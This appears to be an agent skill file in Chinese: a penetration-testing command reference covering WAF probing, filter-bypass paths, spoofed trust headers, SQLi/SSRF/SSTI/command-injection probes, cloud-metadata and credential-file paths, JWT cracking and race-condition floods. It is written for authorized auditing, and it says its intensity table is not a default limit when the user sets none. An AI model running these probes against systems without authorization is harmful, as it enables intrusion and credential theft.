---
name: audit-commands
description: 审计工具与命令速查：反编译取源、指纹与 WAF 识别、路由提取、边界与信任头探测、逐类型 grep 模式库（多语言）、注入探针、CORS/JWT/GraphQL/云元数据、非 HTTP 服务、fuzz 与并发、依赖 CVE 扫描。需要具体命令、curl/grep 写法时使用。
---

# 工具与命令速查

可复制粘贴的命令库，按审计阶段组织。目标占位符统一 `TARGET`；示例默认 Java/JSP，附其他栈等价。**语言专属的完整锚点见 `language-stack-audit`——本篇只给跨栈通用与最高频的几条。**

```bash
# 0 先定栈：决定后面所有 grep 用哪套模式
ls package.json composer.json requirements.txt pyproject.toml go.mod pom.xml build.gradle \
   Gemfile *.csproj Cargo.toml CMakeLists.txt 2>/dev/null
find . -type f -name "*.*" | sed 's/.*\.//' | sort | uniq -c | sort -rn | head -20
```

## 1 取源与反编译

| 栈 | 工具 | 命令 |
|---|---|---|
| Java | CFR | `java -jar cfr.jar app.jar --outputdir ./src` |
| Java | Procyon | `java -jar procyon.jar app.jar -o ./src` |
| Java | 整包 classes | `jar -cf all.jar -C WEB-INF/classes . && java -jar cfr.jar all.jar --outputdir ./src` |
| .NET | ILSpy | `ilspycmd app.dll -o ./src` |
| Python | decompyle3 | `decompyle3 mod.pyc > mod.py` |
| Node | 美化/反混淆 | `npx prettier bundle.js`；`npx webcrack bundle.js` |
| 前端 | source map | `npx source-map-explorer` / `unwebpack-sourcemap` |

```bash
# 取源纪律：所有归档/备份/嵌套包都翻出来
find . \( -name "*.jar" -o -name "*.war" -o -name "*.rar" -o -name "*.zip" \
       -o -name "*.bak" -o -name "*.class.bak" -o -name "*副本*" \)
```

## 2 侦察与指纹

```bash
# HTTP 指纹
curl -s -I "http://TARGET/" | grep -iE "server|x-powered|set-cookie|location|www-authenticate"

# 登录页/首页信息泄露（内网IP、版本、样例账号、SSO端口）
curl -s "http://TARGET/login" | grep -noE "([0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]+)?|version[^<]{0,20}|copyright[^<]{0,40}"

# 端口发现（授权内）——同主机其他实例
nmap -p- --min-rate 2000 TARGET

# WAF 识别（做任何注入探测之前）——恶意 payload 与正常请求的差分
for q in "hello" "<script>alert(1)</script>" "1'%20or%201=1--" "../../etc/passwd"; do
  printf "%-32s " "${q:0:30}"
  curl -s -o /dev/null -w "code=%{http_code} size=%{size_download} t=%{time_total}\n" "http://TARGET/?q=$q"
done
# 对照：不存在的路径也打恶意 payload —— 一样被拦 = 拦截在应用之前（网关型 WAF）
curl -s -o /dev/null -w "nopath code=%{http_code}\n" "http://TARGET/nope999?q=<script>alert(1)</script>"
wafw00f "http://TARGET/"   # 有工具时

# 目录与残留
ffuf -u "http://TARGET/FUZZ" -w wordlist.txt -mc 200,301,302,403
for p in .git/HEAD .svn/entries WEB-INF/web.xml backup.zip .DS_Store swagger.json v2/api-docs; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "http://TARGET/$p"; done
```

## 3 攻击面测绘（白盒提取路由）

```bash
# Spring 控制器与路由
grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" src --include="*.java"

# JSP 全清单
find . -name "*.jsp"

# web.xml 的 servlet/filter 映射（含被注释的！）
grep -nE "servlet-mapping|filter-mapping|url-pattern|<!--" WEB-INF/web.xml

# 其他栈路由（逐栈都要跑）
grep -rn "Route::\|Route::group"            .    # Laravel
grep -rn "@app.route\|urlpatterns\|path(\|re_path(" .   # Flask / Django
grep -rn "app\.\(get\|post\|put\|delete\)(\|router\.\|@Controller\|@Get(\|@Post(" .  # Express / NestJS
grep -rn "r\.\(GET\|POST\)\|http.HandleFunc\|mux.Handle" .   # Go
grep -rn "resources :\|get '\|post '"       .    # Rails routes.rb
grep -rn "\[Route(\|\[HttpGet\|\[HttpPost\|MapControllerRoute" .   # .NET

# API 规格一次拿全端点（比爆破高效百倍）
for p in swagger.json v2/api-docs v3/api-docs openapi.json api-docs actuator/mappings \
         api/schema/ rails/info/routes api-json graphql; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "http://TARGET/$p"; done
```

## 4 黑盒可达性与边界探测

```bash
# 逐类型未授权响应（推断过滤器规则）
for u in "/page.jsp" "/login.jsp" "/x.controller" "/SomeServlet" "/a.js" "/nope123.jsp"; do
  printf "%-24s " "$u"
  curl -s -o /dev/null -w "code=%{http_code} size=%{size_download} loc=%{redirect_url}\n" "http://TARGET$u"
done

# 边界绕过变形（对"被拦"路径逐个试）
for v in "/x.jsp;.js" "/x.jsp%00.js" "/x%2ejsp" "//x.jsp" "/./x.jsp" "/x.jsp/a.js" "/X.JSP"; do
  curl -s -o /dev/null -w "%{http_code}  $v\n" "http://TARGET$v"; done

# 信任头/IP 白名单绕过（差分：响应变化=该头被信任）
for h in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "Proxy-Client-IP: 127.0.0.1" "X-Original-URL: /admin"; do
  printf "[%-28s] " "$h"
  curl -s -X POST "http://TARGET/InternalServlet" -H "$h" -w "\n"; done
```

## 5 白盒污点：逐类型 grep 模式库

逆向连线：先扫 Sink，再向上追 Source。命中后人工判参数来源与有无有效 Sanitizer。

```bash
SRC=./src   # 反编译输出目录

# —— SQL / HQL 注入 ——
grep -rnE 'execute(Query|Update)\("[^"]*"\s*\+' $SRC --include="*.java"
grep -rnE 'createQuery\(|createSQLQuery\(' $SRC --include="*.java" | grep '+'
grep -rnE '\$pdo->query\(|mysqli_query\(|\.query\(`.*\$\{|execute\(f?"' .

# —— 命令执行 ——
grep -rnE 'Runtime\.getRuntime\(\)\.exec|new ProcessBuilder' $SRC
grep -rnE 'system\(|exec\(|shell_exec\(|popen\(|subprocess\.|child_process' .

# —— 反序列化 ——
grep -rnE 'readObject|XMLDecoder|\.fromXML\(|enableDefaultTyping|JSON\.parse|readUnshared' $SRC
grep -rnE 'unserialize\(|pickle\.loads|yaml\.load\(|BinaryFormatter' .

# —— 文件操作（穿越/任意读写删）——
grep -rnE 'new (File|FileInputStream|FileOutputStream)\([^)]*\+' $SRC
grep -rn 'getRealPath\|transferTo\|\.delete()' $SRC | grep -iE 'getParameter|filename|path'
grep -rnE 'include|require|readfile|fopen|file_get_contents|fs\.readFile|send_file' .

# —— SSRF ——
grep -rnE 'new URL\(|openConnection|HttpGet\(|HttpPost\(' $SRC | grep -i 'getParameter\|url'
grep -rnE 'curl_exec|requests\.(get|post)|fetch\(|axios\.' .

# —— XXE（找解析器创建点，再看有无禁 DTD）——
grep -rnE 'new SAXReader|DocumentBuilderFactory\.newInstance|SAXParserFactory|new SAXBuilder' $SRC
grep -rn 'disallow-doctype-decl\|external-general-entities\|FEATURE_SECURE' $SRC   # 加固缺失=有面

# —— XSS（未编码输出）——
grep -rnoE '<%=\s*request\.getParameter\([^)]*\)\s*%>' . --include="*.jsp"
grep -rnE 'getWriter\(\)\.(print|write)|out\.print' $SRC | grep -i getParameter
grep -rnE 'innerHTML|document\.write|v-html|dangerouslySetInnerHTML|\|\s*safe' .

# —— 开放重定向 ——
grep -rnE 'sendRedirect\(|setHeader\("Location"|res\.redirect\(|window\.open\(|location\s*=' $SRC .

# —— 硬编码凭据/弱密码学 ——
grep -rniE '(password|passwd|pwd|secret|appkey|apikey|access_key|token|private_key)\s*=\s*"[^"]{4,}"' $SRC
grep -rnE 'Cipher\.getInstance\("(DES|AES)"\)|/ECB/|Math\.random|new Random\(' $SRC

# —— 信任头/身份来源（未知漏洞：信任边界）——
grep -rnE 'getHeader\("(X-Forwarded-For|X-Real-IP|Proxy-Client-IP)"|getRemoteAddr' $SRC
grep -rnE 'getParameter\("(userid|uid|role|isAdmin|orgId)' $SRC   # 客户端传身份=可疑

# —— 变体分析：把已发现漏洞抽象成模式再全扫 ——
grep -rn "getRealPath" $SRC | grep -i "getParameter"   # 找所有"路径来自参数"的兄弟
```

## 6 注入/输入类黑盒探针

```bash
# SQLi：布尔差分 + 时延
curl -s "http://TARGET/api?id=1%20and%201=1" | md5sum
curl -s "http://TARGET/api?id=1%20and%201=2" | md5sum      # 不同=可能注入
time curl -s "http://TARGET/api?id=1%20and%20sleep(5)"     # 延迟=时间盲注

# 路径穿越（读无害文件证明即可）
curl -s "http://TARGET/download?file=../../WEB-INF/web.xml"

# SSRF（带外）
curl -s "http://TARGET/fetch?url=http://YOUR-DNSLOG/"

# XSS 反射（看是否原样回显未编码）
curl -s "http://TARGET/q?s=xsstest7391<b>" | grep -o "xsstest7391<b>"

# SSTI
curl -s "http://TARGET/p?name=\${7*7}" | grep -o "49"

# 命令注入（时延/带外）
curl -s "http://TARGET/ping?host=127.0.0.1%3Bsleep%205" -o /dev/null -w "%{time_total}\n"
```

自动化：sqlmap（注入）、Burp（Intruder/Collaborator 带外）、nuclei（模板化已知漏洞）。生产环境控制强度、避免破坏性开关。

## 6.5 认证 / 授权 / 令牌

```bash
# 角色矩阵：同一批端点用不同身份各打一遍（R0 游客 / R1 用户A / R2 用户B / R3 管理员）
while read u; do
  printf "%-40s " "$u"
  curl -s -o /dev/null -w "R0=%{http_code} " "http://TARGET$u"
  curl -s -o /dev/null -w "R1=%{http_code} " -b "$SESS_A" "http://TARGET$u"
  curl -s -o /dev/null -w "R3=%{http_code}\n" -b "$SESS_ADMIN" "http://TARGET$u"
done < endpoints.txt

# 水平越权差分（A 的会话取 B 的资源，与 B 自己取做内容比对）
curl -s -b "$SESS_A" "http://TARGET/api/order?id=$ID_B" -o a.txt
curl -s -b "$SESS_B" "http://TARGET/api/order?id=$ID_B" -o b.txt
diff a.txt b.txt && echo "IDOR: A 拿到了 B 的数据"

# JWT 快速看载荷（不验签，只解码）
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
# JWT 工具：jwt_tool（alg:none / kid 注入 / jku / 离线弱密钥）
jwt_tool "$JWT" -M pb              # playbook 扫
jwt_tool "$JWT" -C -d wordlist.txt # 离线爆弱密钥（不打目标，不算在线爆破）
# Flask session 伪造（拿到 secret_key 后）
flask-unsign --decode --cookie "$COOKIE"

# 白盒：身份来源可疑点（客户端传身份）——各栈
grep -rniE 'getParameter\("(uid|userid|role|isadmin|orgid|tenantid)"' $SRC          # Java
grep -rniE '\$_(GET|POST|REQUEST)\[.(uid|user_id|role|is_admin|tenant)' .           # PHP
grep -rniE 'request\.(GET|POST|args|json)\[.(uid|user_id|role|tenant)' .            # Py
grep -rniE 'req\.(query|body|params)\.(uid|userId|role|isAdmin|tenantId)' .         # Node
# 裸奔方法清单 = 控制器方法全集 − 授权注解集
grep -rn "@RequestMapping\|@GetMapping\|@PostMapping" $SRC > /tmp/all_ep.txt
grep -rn "@PreAuthorize\|@RequiresPermissions\|@Secured\|@RolesAllowed" $SRC > /tmp/authz.txt
# 少了租户条件的查询
grep -rniE 'select .* from [a-z_]+ where' $SRC | grep -viE 'tenant|company|org|corp'
```

## 6.6 现代面：CORS / GraphQL / WebSocket / 云 / 非 HTTP

```bash
# CORS：反射 Origin + credentials = 成立
for o in "https://evil.com" "null" "https://TARGET.evil.com"; do
  printf "%-28s " "$o"
  curl -s -o /dev/null -D- -H "Origin: $o" "http://TARGET/api/me" \
    | grep -i "access-control-allow-\(origin\|credentials\)" | tr '\n' ' '; echo
done

# 安全响应头基线
curl -s -D- -o /dev/null "http://TARGET/" | grep -iE \
 "content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy"

# GraphQL introspection
curl -s -X POST "http://TARGET/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | head -c 500

# WebSocket：换 Origin 仍 101 = CSWSH 面
curl -s -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" -H "Origin: https://evil.com" \
  -b "$SESS" "http://TARGET/ws" | head -1

# Host 头攻击（看响应里的绝对 URL 是否跟着变）
curl -s "http://TARGET/reset" -H "Host: evil.com"            | grep -o "https\?://[^\"' ]*" | head
curl -s "http://TARGET/reset" -H "X-Forwarded-Host: evil.com" | grep -o "https\?://[^\"' ]*" | head

# 云元数据（拿到 SSRF 后；也可经任意文件读拿凭据文件）
# AWS 169.254.169.254/latest/meta-data/iam/security-credentials/
# 阿里云 100.100.100.200/latest/meta-data/ram/security-credentials/
# 文件读旁路：~/.aws/credentials  ~/.kube/config  /proc/self/environ

# 非 HTTP 服务无认证判定（端口扫出来就要测，别只记录）
redis-cli -h TARGET -p 6379 ping
curl -s "http://TARGET:9200/_cat/indices"                 # Elasticsearch
echo stat | nc TARGET 2181                                # Zookeeper
curl -s "http://TARGET:2375/version"                      # Docker API
curl -sk "https://TARGET:10250/pods" | head -c 200        # kubelet
nmap -sV --script "*-info,*-empty-password" -p 6379,27017,9200,11211,2181,1099,20880 TARGET

# 白盒：解压穿越 / 批量赋值 / 云凭据
grep -rniE 'getName\(\)|extractall|extractTo|ZipEntry|TarEntry' . | grep -iE 'zip|tar|unzip'
grep -rniE '@RequestBody|ShouldBind|params\.permit!|\$request->all\(\)|readValue\(.*\.class' .
grep -rniE '(AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|aws_secret|BEGIN (RSA|EC|OPENSSH) PRIVATE)' .
```

## 7 未知漏洞：Fuzz / 并发 / 差分

```bash
# 参数 fuzz（畸形值）
ffuf -u "http://TARGET/api?p=FUZZ" -w payloads.txt -mc all -fr "正常特征"
# 隐藏参数挖掘
arjun -u "http://TARGET/api"

# 并发竞态（突破"限一次"）
seq 30 | xargs -P30 -I{} curl -s -b "SESSION=x" -X POST "http://TARGET/claim"
# 打不中窗口时上单包攻击（把请求压进同一个 TCP 包，抖动降到亚毫秒）
#   Turbo Intruder gate 模式 / Burp Repeater 分组「并行发送」/ HTTP2 多路复用
# GraphQL 天然单包并发：一个请求里 N 个 alias mutation

# 覆盖引导 fuzz（有源码/harness 时）
# JVM: Jazzer  |  native: AFL++/libFuzzer  |  Go: go-fuzz  |  Python: Atheris

# 补丁差分（挖 1-day/变体）
diff -ru old_src/ new_src/
# 二进制：BinDiff / Diaphora
```

## 8 依赖 / 组件 CVE 扫描

```bash
trivy fs --scanners vuln .
dependency-check.sh --scan ./lib --format HTML --out ./dep
grype dir:.
# 语言专用：npm audit / pip-audit / composer audit / govulncheck
```

## 9 SAST（广度扫描，人工复核）

```bash
semgrep --config auto .
# Java: find-sec-bugs(SpotBugs)  |  PHP: Psalm/Phan  |  Py: Bandit  |  Go: gosec
# 深度: CodeQL —— 写自定义 query 表达 "Source→Sink 无 Sanitizer"，变体分析利器
codeql database create db --language=java && codeql database analyze db my-queries.ql
```

## 附：强度分级参考（**不是默认红线**）

> ⚠️ **红线以用户在 P0 填写的为准。用户没填红线时，不要把下面这张表当默认禁令套上去**——按授权范围正常探测与复现即可。这张表只是「和用户确认红线时可以拿来对照的分级模板」，以及生产环境下的强度自律参考。

| 强度 | 动作 |
|---|---|
| 最低 | 只读探测、响应差分、时延判定、带外确认、字节码分析、读无害文件（web.xml/配置） |
| 中 | 盲注（短 sleep）、受控并发、默认口令试一次、任意文件读（节制隐私） |
| 高 | 落地写入、真传 WebShell、大量并发、`--dump` / `--os-shell`、口令爆破、DoS |

通用自律（与红线无关，任何授权下都值得遵守）：

- **能用差分/时延/带外证明的，就不必落地真实利用**——证明缺陷存在是目的，打穿不是。
- 触发 WAF 会产生告警与封禁，控制频率。
- 碰到真实 PII 证明即止，不导出、不落盘，报告里脱敏（`audit-reporting` R5）。
- 发现**他人植入**的 WebShell/后门/入侵痕迹：立即停手、保全证据、上报，不深入不清理。
